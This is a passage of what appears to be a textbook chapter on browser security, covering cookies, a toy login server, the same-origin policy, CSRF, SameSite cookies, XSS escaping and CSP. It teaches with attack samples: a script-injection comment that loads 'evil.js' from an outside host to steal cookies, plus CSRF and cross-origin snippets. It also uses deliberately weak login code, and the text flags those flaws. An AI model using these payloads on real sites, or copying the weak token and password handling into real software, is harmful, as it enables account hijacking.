---
title: Keeping Data Private
chapter: 10
prev: scripts
next: visual-effects
...

Our browser has grown up and now runs (small) web applications. With
one final step---user identity via cookies---it will be able to
run all sorts of personalized online services. But capability demands
responsibility: our browser must now secure cookies against
adversaries interested in stealing them. Luckily, browsers have
sophisticated systems for controlling access to cookies and preventing
their misuse.

::: {.warning}
Web security\index{web security} is a vast topic, covering browser,
network, and applications security. It also involves educating the user,
so that attackers can't mislead them into revealing their own secure data.
This chapter can't cover all of that: if you're writing web
applications or other security-sensitive code, this book is not
enough.
:::

Cookies
=======

With what we've implemented so far there's no way for a web server to
tell whether two HTTP requests come from the same user or from two
different ones: our browser is effectively anonymous.[^fingerprinting]
That means it can't "log in" anywhere, since a logged-in user's
requests would be indistinguishable from those of not-logged-in users.

[^fingerprinting]: I don't mean anonymous against malicious attackers,
    who might use *browser fingerprinting* or similar techniques to
    tell users apart. I mean anonymous in the good-faith sense.

The web fixes this problem with cookies. A cookie---the name is
meaningless, ignore it---is a little bit of information stored by your
browser on behalf of a web server. The cookie distinguishes your
browser, and is sent with each web request so the server can
distinguish which requests come from which user.

Here's the technical details. In the HTTP response a server can send a
`Set-Cookie` header. This header contains a key-value pair; for
example, the following header sets the value of the `foo` cookie to
`bar`:

    Set-Cookie: foo=bar
    
The browser remembers this key-value pair, and the next time it makes
a request to the same server (cookies are site-specific), the browser
echoes it back in the `Cookie` header:

    Cookie: foo=bar

Servers can also set multiple cookies and also set parameters like
expiration dates, but this `Set-Cookie` / `Cookie` mechanism is the
core principle.

Servers use cookies to assign identities to their users. Let's use
cookies to write a login system for our guest book. Each user will be
identified by a long random number stored in the `token`
cookie.[^secure-random] The server will either extract a token from
the `Cookie` header, or generate a new one for new visitors:

[^secure-random]: This `random.random` call returns a decimal number
    with 53 bits of randomness. That's not great; 256 bits is ideal.
    And `random.random` is not a secure random number generator: by
    observing enough tokens you can predict future values and use
    those to hijack accounts. A real web application must use a
    cryptographically secure random number generator for tokens.

``` {.python file=server}
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

Of course, new visitors need to be told to remember their
newly-generated token:

``` {.python file=server replace=%7b%7d/%7b%7d;%20SameSite%3dLax}
def handle_connection(conx):
    # ...
    if 'cookie' not in headers:
        template = "Set-Cookie: token={}\r\n"
        response += template.format(token)
    # ...
```

The first code block runs after all the request headers are parsed,
before handling the request in `do_request`, while the second code
block runs after `do_request` returns, when the server is assembling
the HTTP response.

With these two code changes, each visitor to the guest book now has a
unique identity. We can now use that identity to store information
about each user. Let's do that in a server side `SESSIONS`
variable:[^cookies-limited]

[^cookies-limited]: Browsers and servers both limit header lengths, so
    it's best to store minimal data in cookies. Plus, cookies are sent
    back and forth on every request, so long cookies mean a lot of
    useless traffic. It's therefore wise to store user data on the
    server, and only store a pointer to that data in the cookie. And,
    since cookies are stored by the browser, they can be changed
    arbitrarily by the user, so it would be insecure to trust the
    cookie data.

``` {.python file=server}
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

`SESSIONS` maps tokens to session data dictionaries. I'm passing that
session data via `do_request` to individual pages like `show_comments`
and `add_entry`:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    if method == "GET" and url == "/":
        return "200 OK", show_comments(session)
    # ...
    elif method == "POST" and url == "/add":
        params = form_decode(body)
        add_entry(session, params)
        return "200 OK", show_comments(session)
    # ...
```

You'll need to modify the argument lists for `add_entry` and
`show_comments` to accept this new argument. We now have the
foundation upon which to build a login system.

::: {.further}
The [original specification][netscape-spec] for cookies says there is "no compelling
reason" for calling them "cookies", but in fact using this term for
opaque identifiers exchanged between programs seems to date way back;
[Wikipedia][wiki-magic-cookie] traces it back to at least 1979, and
cookies were used in [X11][x-cookie] for authentication before they
were used on the web.
:::

[netscape-spec]: https://curl.se/rfc/cookie_spec.html
[wiki-magic-cookie]: https://en.wikipedia.org/wiki/Magic_cookie
[x-cookie]: https://en.wikipedia.org/wiki/X_Window_authorization#Cookie-based_access

A login system
==============

I want users to log in before posting to the guest book. Minimally,
that means:

- Users will log in with a username and password.
- The server will hard-code a set of valid logins.
- Users have to be logged in to add guest book entries.
- The server will display who added which guest book entry.

Let's start coding. First, we'll need to store usernames in
`ENTRIES`:[^hackers-movie]

[^hackers-movie]: The pre-loaded comments reference 1995's *Hackers*.
    [Hack the Planet!](https://xkcd.com/1337)

``` {.python file=server}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```

Each user will also have a password:

``` {.python file=server}
LOGINS = {
    "crashoverride": "0cool",
    "cerealkiller": "emmanuel"
}
```

When we print the guest book entries, we'll write who authored them:

``` {.python file=server replace=+%20entry/+%20html.escape(entry),+%20who/+%20html.escape(who)}
def show_comments(session):
    # ...
    for entry, who in ENTRIES:
        out += "<p>" + entry + "\n"
        out += "<i>by " + who + "</i></p>"
    # ...
```

Now, let's handle logging in. We'll determine whether a user is logged
in using the `user` key in the session data, and use that to show
either the comment form or a login link:

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        out += "<h1>Hello, " + session["user"] + "</h1>"
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"
    # ...
```

Likewise, `add_entry` must check that the user is logged in before
posting comments:

``` {.python file=server}
def add_entry(session, params):
    if "user" not in session: return
    if 'guest' in params and len(params['guest']) <= 100:
        ENTRIES.append((params['guest'], session["user"]))
```

Note that the username from the session is stored into `ENTRIES`.

Since the session data (including the `user` key) is stored on the
server, users can't modify it directly. That's good, because we only
want to set the `user` key in the session data if users supply the
right password in the login form.

Let's build that login form. We'll need a handler for `/login`:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "GET" and url == "/login":
        return "200 OK", login_form(session)
    # ...
```

This URL shows a form with a username and a password
field:[^password-input]

[^password-input]: I've given the `password` input area the type
    `password`, which in a real browser will draw stars or dots
    instead of showing what you've entered, though our browser doesn't
    do that.

``` {.python file=server}
def login_form(session):
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body 
```

Note that the form `POST`s its data to the `/` URL. We'll want to
handle these `POST` requests in a new function that checks passwords
and does logins:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "POST" and url == "/":
        params = form_decode(body)
        return do_login(session, params)
    # ...
```

This `do_login` function checks passwords and logs people in by
storing their user name in the session data:[^timing-attack]

[^timing-attack]: Actually, using `==` to compare passwords like this
    is a bad idea: Python's equality function for strings scans the
    string from left to right, and exits as soon as it finds a
    difference. Therefore, you get a clue about the password from *how
    long* it takes to check a password guess; this is called a
    [timing side channel][timing-attack]. This book is about the
    browser, not the server, but a real web application has to do a
    [constant-time string comparison][constant-time]!
    
[timing-attack]: https://en.wikipedia.org/wiki/Timing_attack
[constant-time]: https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html

``` {.python file=server}
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

Try it out in a normal web browser. You should be able to go to the
main guest book page, click the link to log in, log in with one of the
username/password pairs above, and then be able to post entries.^[The
login flow slows down debugging. You might want to add the empty
string as a username/password pair.] Of course, this login system has
a whole slew of insecurities.[^insecurities] But the focus of this
book is the browser, not the server, so once you're sure it's all
working, let's switch back to our web browser and implement cookies.

[^insecurities]: The insecurities include not hashing passwords, not
    using [`bcrypt`][bcrypt], not allowing password changes, not
    having a "forget your password" flow, not forcing TLS, not
    sandboxing the server, and many many others.
    
[bcrypt]: https://auth0.com/blog/hashing-in-action-understanding-bcrypt/

::: {.further}
A more obscure browser authentication system is [TLS client
certificates][client-certs]. The user downloads a public/private key
pair from the server, and the browser then uses them to prove who it
is on later requests to that server. Also, if you've ever seen a URL
with `username:password@` before the hostname, that's [HTTP
authentication][http-auth]. Please don't use either method in new
websites (without a good reason).
:::

[client-certs]: https://aboutssl.org/ssl-tls-client-authentication-how-does-it-works/

[http-auth]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication



Implementing cookies
====================

To start, we need a place in the browser that stores cookies; that
data structure is traditionally called a *cookie jar*:[^silly-name]

[^silly-name]: Because once you have one silly name it's important to
    stay on-brand.

``` {.python}
COOKIE_JAR = {}
```

Since cookies are site-specific, our cookie jar will map sites to
cookies. Note that the cookie jar is global, not limited to a
particular tab. That means that if you're logged in to a website and
you open a second tab, you're logged in on that tab as well.

When the browser visits a page, it needs to send the cookie for that
site:

``` {.python replace=(self/(self%2c%20top_level_url,cookie%20%3d/cookie%2c%20params%20%3d}
class URL:
    def request(self, payload=None):
        # ...
        if self.host in COOKIE_JAR:
            cookie = COOKIE_JAR[self.host]
            body += "Cookie: {}\r\n".format(cookie)
        # ...
```

Symmetrically, the browser has to update the cookie jar when it sees a
`Set-Cookie` header:[^multiple-set-cookies]

[^multiple-set-cookies]: A server can actually send multiple
    `Set-Cookie` headers to set multiple cookies in one request.

``` {.python replace=(self/(self%2c%20top_level_url,%3d%20kv/%3d%20(kv%2c%20params),kv/cookie}
class URL:
    def request(self, payload=None):
        # ...
        if "set-cookie" in headers:
            kv = headers["set-cookie"]
            COOKIE_JAR[self.host] = kv
        # ...
```

You should now be able to use your toy browser to log in to the guest
book and post to it. Moreover, you should be able to open the guest
book in two browsers simultaneously---maybe your toy browser and a
real browser as well---and log in and post as two different users.

Note that `request` can be called multiple times to load a web page's
HTML, CSS, and JavaScript resources. Later requests transmit cookies
set by previous responses, so for example our guest book sets a cookie
when the browser first requests the page and then receives that
cookie when our browser later requests the page's CSS file.

Now that our browser supports cookies and uses them for logins, we
need to make sure cookie data is safe from malicious actors. After
all: if someone stole your `token` cookie, they could copy it into
their browser, and the server would think they are you. We need to
prevent that.

::: {.further}
At one point, an attempt was made to "clean up" the cookie
specification in [RFC 2965][rfc-2965], including human-readable cookie
descriptions and cookies restricted to certain ports. This required
introducing the `Cookie2` and `Set-Cookie2` headers; the new headers
were not popular. They are now [obsolete][rfc-6265].
:::

[rfc-2965]: https://datatracker.ietf.org/doc/html/rfc2965
[rfc-6265]: https://datatracker.ietf.org/doc/html/rfc6265


Cross-site requests
===================

Cookies are site-specific, so one server shouldn't be sent another
server's cookies.[^tls][^dns][^bgp][^oof] But if an attacker is
clever, they might be able to get *the server* or *the browser* to
help them steal cookie values.

[^tls]: Well... Our connection isn't encrypted, so an attacker could
    read it from an open Wifi connection. But another *server*
    couldn't.

[^dns]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies.
    Some ISPs support DNSSEC, which prevents this, but not all.

[^bgp]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^oof]: Security is very hard.

The easiest way for an attacker to steal your private data is to ask
for it. Of course, there's no API in the browser for a website to ask
for another website's cookies. But there _is_ an API to make requests
to another website. It's called `XMLHttpRequest`.[^weird-name]

[^weird-name]: It's a weird name! Why is `XML` capitalized but not
    `Http`? And it's not restricted to XML! Ultimately, the naming is
    [historical][xhr-history], dating back to Microsoft's "Outlook Web
    Access" feature for Exchange Server 2000.
    
[xhr-history]: https://en.wikipedia.org/wiki/XMLHttpRequest#History

`XMLHttpRequest` sends asynchronous HTTP requests from JavaScript.
Since I'm using `XMLHttpRequest` just to illustrate security issues,
I'll implement a minimal version here. Specifically, I'll support only
*synchronous* requests HTTP.[^obsolete] Using this minimal
`XMLHttpRequest` looks like this:
    
[^obsolete]: Synchronous `XMLHttpRequests` are slowly moving through
    [deprecation and obsolescence][xhr-open], but I'm using them here
    because they are easier to implement.

[xhr-open]: https://xhr.spec.whatwg.org/#the-open()-method

``` {.javascript .example}
x = new XMLHttpRequest();
x.open("GET", url, false);
x.send();
// use x.responseText
```

We'll define the `XMLHttpRequest` objects and methods in JavaScript.
The `open` method will just save the method and URL:[^more-options]

[^more-options]: `XMLHttpRequest` has more options not implemented
    here, like support for usernames and passwords. This code is also
    missing some error checking, like making sure the method is a
    valid HTTP method supported by our browser.

``` {.javascript}
function XMLHttpRequest() {}

XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}
```

The `send` method calls an exported function:[^even-more-options]

[^even-more-options]: As above, this implementation skips important
    `XMLHttpRequest` features, like setting request headers (and
    reading response headers), changing the response type, or
    triggering various events and callbacks during the request.

``` {.javascript}
XMLHttpRequest.prototype.send = function(body) {
    this.responseText = call_python("XMLHttpRequest_send",
        this.method, this.url, body);
}
```

The `XMLHttpRequest_send` function just calls `request`:[^note-method]

[^note-method]: Note that the `method` argument is ignored, because
    our `request` function chooses the method on its own based on
    whether a payload is passed. This doesn't match the standard
    (which allows `POST` requests with no payload), and I'm only doing
    it here for convenience.

``` {.python replace=request(/request(self.tab.url%2c%20}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        headers, out = full_url.request(body)
        return out
```

With `XMLHttpRequest`, a web page can make HTTP requests in response
to user actions, making websites more interactive! This API, and newer
analogs like [`fetch`][mdn-fetch], are how websites allow you to like a
post, see hover previews, or submitting a form without reloading.

[mdn-fetch]: https://developer.mozilla.org/en-US/docs/Web/API/fetch

::: {.further}
`XMLHttpRequest` objects have [`setRequestHeader`][xhr-srh] and
[`getResponseHeader`][xhr-grh] method to control HTTP headers.
However, this could allow a script to interfere with the cookie
mechanism or with other security measures, so some
[request][bad-req-headers] and [response][bad-resp-headers] headers
are not accessible from JavaScript.
:::

[xhr-grh]: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getResponseHeader
[xhr-srh]: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader
[bad-req-headers]: https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name
[bad-resp-headers]: https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name

Same-origin policy
==================

However, new capabilities lead to new responsibilities. HTTP requests
sent with `XMLHttpRequest` include cookies. This is by design: when
you "like" something, the server needs to associate the "like" to your
account. But it also means that `XMLHttpRequest` can access private
data, and thus need to protect it.

Let's imagine an attacker wants to know your username on our guest
book server. When you're logged in, the guest book includes your
username on the page (where it says "Hello, so and so"), so reading
the guest book with your cookies is enough to determine your username.

With `XMLHttpRequest`, an attacker's website[^why-visit-attackers]
could request the guest book page:

[^why-visit-attackers]: Why is the user on the attacker's site?
    Perhaps it has funny memes, or it's been hacked and is being used
    for the attack against its will, or perhaps the evil-doer paid for
    ads on sketchy websites where users have low standards for
    security anyway.

``` {.javascript .example}
x = new XMLHttpRequest();
x.open("GET", "http://localhost:8000/", false);
x.send();
user = x.responseText.split(" ")[2].split("<")[0];
```

The issue here is that one server's web page content is being sent to
a script running on a website delivered by another server. Since the
content is derived from cookies, this leaks private data.

To prevent issues like this, browsers have a [*same-origin
policy*][same-origin-mdn], which says that requests like
`XMLHttpRequest`s[^and-some-others] can only go to web pages on the
same "origin"---scheme, hostname, and port.[^not-cookies] This way,
one website's private data has to stay on that website, and cannot be
leaked to an attacker on another server.

[same-origin-mdn]: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy

[^and-some-others]: Some kinds of requests are not subject to the
    same-origin policy (most prominently CSS and JavaScript files
    linked from a web page); conversely, the same-origin policy also
    governs JavaScript interactions with `iframe`s, images,
    `localStorage` and many other browser features.

[^not-cookies]: You may have noticed that this is not the same
    definition of "website" as cookies use: cookies don't care about
    scheme or port! This seems to be an oversight or incongruity left
    over from the messy early web.

Let's implement the same-origin policy for our browser. We'll need to
compare the URL of the request to the URL of the page we are on:

``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        if full_url.origin() != self.tab.url.origin():
            raise Exception("Cross-origin XHR request not allowed")
        # ...
```

The `origin` function can just strip off the path from a URL:

``` {.python}
class URL:
    def origin(self):
        return self.scheme + "://" + self.host + ":" + str(self.port)
```

Now an attacker can't read the guest book web page. But can they write
to it? Actually...

::: {.further}
One interesting form of the same-origin policy involves images and the
HTML `<canvas>` element. The [`drawImage` method][mdn-drawimage]
allows drawing an image to a canvas, even if that image was loaded
from another origin. But to prevent that image from being read back
with [`getImageData`][mdn-getimagedata] or related methods, writing
cross-origin data to a canvas [taints][tainted] it, blocking read
methods.
:::

[mdn-drawimage]: https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage

[mdn-getimagedata]: https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/getImageData

[tainted]: https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image


Cross-site request forgery
==========================

The same-origin policy prevents cross-origin `XMLHttpRequest` calls.
But the same-origin policy doesn't apply to normal browser actions
like clicking a link or filling out a form. This enables an exploit
called *cross-site request forgery*, often shortened to CSRF.

In cross-site request forgery, instead of using `XMLHttpRequest,` the
attacker uses a form that submits to the guest book:

``` {.html}
<form action="http://localhost:8000/add" method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Even though this form is on the evildoer's website, when you submit
the form, the browser will make an HTTP request to the *guest book*.
And that means it will send its guest book cookies, so it will be
logged in, so the guest book code will allow a post. But the user has
no way of knowing which server a form submits to---the attacker's web
page could have misrepresented that---so they may have posted
something they didn't mean to.[^further-disguise]

[^further-disguise]: Even worse, the form submission could be
    triggered by JavaScript, with the user not involved at all. And
    this kind of attack can be further disguised by hiding the entry
    widget, pre-filling the post, and styling the button to look like
    a normal link.

Of course, the attacker can't read the response, so this doesn't leak
private data to the attacker. But it can allow the attacker to _act_
as the user! Posting a comment this way is not too scary (though shady
advertisers will pay for it!) but posting a bank transaction is. And
if the website has a change-of-password form, there could even be a
way to take control of the account.

Unfortunately, we can't just apply the same-origin policy to form
submissions.[^google-search] So how do we defend against this attack?

[^google-search]: For example, many search forms on websites submit to
    Google, because those websites don't have their own search
    engines.

To start with, there are things the server can do. The usual advice is
to make sure that every POST request to `/add` comes from a form on
our website. The way to do that is to embed a secret value, called a
*nonce*, into the form, and to reject form submissions that don't come
with the right secret value. You can only get a nonce from the server,
and the nonce is tied to the user session,[^per-user] so the attacker
could not embed it in their form.[^like-cookie]

[^per-user]: It's important that nonces are associated with the
    particular user. Otherwise, the attacker can generate a nonce for
    *themselves* and insert it into a form meant for the *user*.

[^like-cookie]: A nonce is somewhat like a cookie, except that it's
    stored inside the HTML instead of the browser cookie. Like a
    cookie, it can be stolen with cross-site scripting.

To implement this fix, generate a nonce and save it in the user
session when a form is requested:[^hidden]
    
[^hidden]: Usually `<input type=hidden>` is invisible, though our
    browser doesn't support this.

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        # ...
        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
```

When a form is submitted, the server checks that the right nonce is
submitted with it:[^multi-nonce]

[^multi-nonce]: In real websites it's usually best to allow one user
    to have multiple active nonces, so that a user can open two forms
    in two tabs without that overwriting the valid nonce. To prevent
    the nonce set from growing over time, you'd have nonces expire
    after a while. I'm skipping this here, because it's not the focus
    of this chapter.

``` {.python file=server}
def add_entry(session, params):
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    # ...
```

Now this form can't be submitted except from our website. Repeat this
nonce fix for each form in the application, and it'll be secure from
CSRF attacks. But server-side solutions are fragile---what if you
forget a form---and relying on every website out there to do it right
is a pipe dream. It'd be better for the browser to provide a fail-safe
backup.

::: {.further}
One unusual attack, similar in spirit to cross-site request forgery,
is [click-jacking][clickjacking]. In this attack, an external site in
a transparent `iframe` is positioned over the attacker's site. The
user thinks they are clicking around one site, but they actually take
actions on a different one. Nowadays, sites can prevent this with the
[`frame-ancestors` directive][csp-frame-ancestors] to
`Content-Security-Policy` or the older [`X-Frame-Options`
header][x-frame-options].
:::

[clickjacking]: https://owasp.org/www-community/attacks/Clickjacking

[x-frame-options]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

[csp-frame-ancestors]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors


SameSite cookies
================

For form submissions, that fail-safe solution is `SameSite` cookies.
The idea is that if a server marks its cookies `SameSite`, the browser
will not send them in cross-site form submissions.[^in-progress]

[^in-progress]: At the time of this writing, the `SameSite` cookie
    standard is still in a draft stage, and not all browsers implement
    that draft fully. So it's possible for this section to become out
    of date, though some kind of `SameSite` cookies will probably be
    ratified. The [MDN page][mdn-samesite] is helpful for checking the
    current status of `SameSite` cookies.
    
[mdn-samesite]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

A cookie is marked `SameSite` in the `Set-Cookie` header like this:

    Set-Cookie: foo=bar; SameSite=Lax

The `SameSite` attribute can take the value `Lax`, `Strict`, or
`None`, and as I write, browsers have and plan different defaults. Our
browser will implement only `Lax` and `None`, and default to `None`.
When `SameSite` is set to `Lax`, the cookie is not sent on cross-site
`POST` requests, but is sent on same-site `POST` or cross-site `GET`
requests.[^iow-links]

[^iow-links]: Cross-site `GET` requests are also known as "clicking a
    link", which is why those are allowed in `Lax` mode. The `Strict`
    version of `SameSite` blocks these too, but you need to design
    your web application carefully for this to work.

First, let's modify `COOKIE_JAR` to store cookie/parameter pairs, and
then parse those parameters out of `Set-Cookie` headers:

``` {.python indent=4 replace=(self/(self%2c%20top_level_url}
def request(self, payload=None):
    if "set-cookie" in headers:
        params = {}
        if ";" in headers["set-cookie"]:
            cookie, rest = headers["set-cookie"].split(";", 1)
            for param_pair in rest.split(";"):
                name, value = param_pair.strip().split("=", 1)
                params[name.lower()] = value.lower()
        else:
            cookie = headers["set-cookie"]
        COOKIE_JAR[self.host] = (cookie, params)
```

When sending a cookie in an HTTP request, the browser only sends the
cookie value, not the parameters:

``` {.python indent=4 replace=(self/(self%2c%20top_level_url}
def request(self, payload=None):
    if self.host in COOKIE_JAR:
        cookie, params = COOKIE_JAR[self.host]
        body += "Cookie: {}\r\n".format(cookie)
```

This stores the `SameSite` parameter of a cookie. But to actually use
it, we need to know which site an HTTP request is being made from.
Let's add a new `top_level_url` parameter to `request` to track that:

``` {.python}
class URL:
    def request(self, top_level_url, payload=None):
        # ...
```

Our browser calls `request` in three places, and we need to send the
top-level URL in each case. At the top of `load`, it makes the initial
request to a page. Modify it like so:

``` {.python}
class Tab:
    def load(self, url, body=None):
        headers, body = url.request(self.url, body)
        # ...
```

Here, `url` is the new URL to visit, but `self.url` is the URL of the
page where the request comes from. Make sure this line comes at the
top of `load`, before `self.url` is changed!

Later, the browser loads styles and scripts with more `request` calls:

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        for script in scripts:
            # ...
            header, body = script_url.request(url)
            # ...
        # ...
        for link in links:
            # ...
            header, body = style_url.request(url)
            # ...
        # ...
```

For these requests the top-level URL is the new URL being loaded.
That's because it is the new page that made us request these
particular styles and scripts, so it defines which of those resources
are on the same site.

Similarly, `XMLHttpRequest`-triggered requests use the tab URL as
their top-level URL:

``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        headers, out = full_url.request(self.tab.url, body)
        # ...
```

The `request` function can now check the `top_level_url` argument
before sending `SameSite` cookies. Remember that `SameSite` cookies
are only sent for `GET` requests or if the new URL and the top-level
URL have the same host name:[^schemeful]

[^schemeful]: At I write this, some browsers also check that the new
    URL and the top-level URL have the same scheme and some browsers
    ignore subdomains, so that `www.foo.com` and `login.foo.com` are
    considered the "same site". If cookies were invented today, they'd
    probably be specific to URL origins, much like CSP policies, but
    alas historical contingencies and backwards compatibility force
    rules that are more complex but easier to deploy.

``` {.python indent=4}
def request(self, top_level_url, payload=None):
    if self.host in COOKIE_JAR:
        # ...
        cookie, params = COOKIE_JAR[self.host]
        allow_cookie = True
        if top_level_url and params.get("samesite", "none") == "lax":
            if method != "GET":
                allow_cookie = self.host == top_level_url.host
        if allow_cookie:
            body += "Cookie: {}\r\n".format(cookie)
        # ...
```

Note that we check whether the `top_level_url` is set---it won't be
when we're loading the first web page in a new tab.

Our guest book can now mark its cookies `SameSite`:

``` {.python file=server}
def handle_connection(conx):
    if 'cookie' not in headers:
        template = "Set-Cookie: token={}; SameSite=Lax\r\n"
        response += template.format(token)
```

But don't remove the nonces we added earlier: `SameSite` provides a
kind of "defense in depth", a fail-safe that makes sure that even if
we forgot a nonce somewhere, we're still secure against CSRF attacks.

::: {.further}
The web was not initially designed around security, which has lead to
some [awkward patches][patches] after the fact. These patches may be
ugly, but a dedication to backwards compatibility is a strength of the
web, and at least newer APIs can be designed around more consistent
policies.
:::

[patches]: https://jakearchibald.com/2021/cors/

Cross-site scripting
====================

Now other websites can't misuse our browser's cookies to read or write
private data. This seems secure! But what about *our own* website?
With cookies accessible from JavaScript, any scripts run on our server
could, in principle, read the cookie value. This might seem
benign---doesn't our server only run `comment.js`? But in fact...

A web service needs to defend itself from being *misused*. Consider
the code in our guest book that outputs guest book entries:

``` {.python file=server indent=8 replace=entry/html.escape(entry),who/html.escape(who)}
out += "<p>" + entry + "\n"
out += "<i>by " + who + "</i></p>"
```

Note that `entry` can be anything, including anything the user might
stick into our comment form. That includes HTML tags, like a custom
`<script>` tag! So, a malicious user could post this comment:

    Hi! <script src="http://my-server/evil.js"></script>

The server would then output this HTML:

    <p>Hi! <script src="http://my-server/evil.js"></script>
    <i>by crashoverride</i></p>

Every user's browser would then download and run the `evil.js` script,
which can send[^document-cookie][^cross-domain][^how-send] the cookies
to the attacker. The attacker could then impersonate other users,
posting as them or misusing any other capabilities those users had.

[^document-cookie]: A site's cookies and cookie parameters are
    available to scripts running on that site through the
    [`document.cookie`][mdn-doc-cookie] API.
    
[mdn-doc-cookie]: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie

[^cross-domain]: See the exercise on `Access-Control-Allow-Origin` for
    more details on how web servers can *opt in* to allowing
    cross-origin requests. To steal cookies, it's the attacker's
    server that would to opt in to receiving stolen cookies. Or, in a
    real browser, `evil.js` could add images or scripts to the page to
    trigger additional requests.

[^how-send]: In our limited browser the attack has to be a little
     clunkier, but the evil script still can, for example, replace the
     whole page with a link that goes to their site and includes the
     token value in the URL. You've seen "please click to continue"
     screens and have clicked through unthinkingly; your users will
     too.

The core problem here is that user comments are supposed to be data,
but the browser is interpreting them as code. In web applications,
this kind of exploit is usually called *cross-site scripting* (often
written "XSS"), though misinterpreting data as code is a common
security issue in all kinds of programs.

The standard fix is to encode the data so that it can't be interpreted
as code. For example, in HTML, you can write `&lt;` to display a
less-than sign.[^ch1-ex] Python has an `html` module for this kind of
encoding:

[^ch1-ex]: You may have implemented this in a [Chapter 1
    exercise](http.md#exercises).

``` {.python file=server}
import html

def show_comments(session):
    # ...
    out += "<p>" + html.escape(entry) + "\n"
    out += "<i>by " + html.escape(who) + "</i></p>"
    # ...
```

This is a good fix, and every application should be careful to do this
escaping. But if you forget to encode any text anywhere---that's a
security bug. So browsers provide additional layers of defense.

::: {.further}
Since the [CSS parser](styles.md) is very permissive, some HTML pages
also parse as valid CSS. This leads to an attack: include an external
HTML page as a style sheet and observe the styling it applies. A
[similar attack][json-hijack] involves including external JSON
files as scripts. Setting a `Content-Type` header can prevent this
sort of attack thanks to browsers' [Cross-Origin Read Blocking][corb]
policy.
:::

[corb]: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/services/network/cross_origin_read_blocking_explainer.md
[json-hijack]: https://owasp.org/www-pdf-archive/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf


Content security policy
=======================

One such layer is the `Content-Security-Policy` header. The full
specification for this header is quite complex, but in the simplest
case, the header is set to the keyword `default-src` followed by a
space-separated list of servers:

    Content-Security-Policy: default-src http://example.org

This header asks the browser not to load any resources (including CSS,
JavaScript, images, and so on) except from the listed origins. If our
guest book used `Content-Security-Policy`, even if an attacker managed
to get a `<script>` added to the page, the browser would refuse to
load and run that script.

Let's implement support for this header. First, we'll need to extract
and parse the `Content-Security-Policy` header:[^more-complex]

[^more-complex]: In real browsers `Content-Security-Policy` can also
    list scheme-generic URLs and other sources like `'self'`. And
    there are keywords other than `default-src`, to restrict styles,
    scripts, and `XMLHttpRequest`s each to their own set of URLs.

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        self.allowed_origins = None
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"].split()
            if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_origins = []
                for origin in csp[1:]:
                    self.allowed_origins.append(URL(origin).origin())
        # ...
```

This parsing needs to happen _before_ we request any JavaScript or
CSS, because we now need to check whether those requests are allowed:

``` {.python}
class Tab:
    def load(self, url, body=None):
        # ...
        for script in scripts:
            script_url = url.resolve(script)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            # ...
```

Note that we need to first resolve relative URLs to know if they're
allowed. Add a similar test to the CSS-loading code.

`XMLHttpRequest` URLs also need to be checked:[^raise-error]

[^raise-error]: Note that when loading styles and scripts, our browser
    merely ignores blocked resources, while for blocked
    `XMLHttpRequest`s it throws an exception. That's because
    exceptions in `XMLHttpRequest` calls can be caught and handled in
    JavaScript.

``` {.python}
class JSContext:
